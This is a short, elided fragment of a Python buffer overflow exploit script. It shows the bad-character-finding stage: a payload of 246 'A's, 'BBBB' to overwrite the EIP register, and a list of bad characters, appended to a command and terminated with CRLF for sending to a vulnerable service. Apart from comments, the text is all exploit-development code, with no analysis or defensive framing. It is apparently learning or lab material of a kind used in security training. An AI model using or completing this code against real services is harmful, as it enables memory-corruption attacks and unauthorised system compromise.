...
# Offset is 246. We are sending 246 'A's followed by 'BBBB' to check EIP, and then the bad characters
buffer = b'A' * 246 + b'BBBB' + bad_chars
...
try:
	...
	find_bad_chars = command + buffer + b'\r\n'
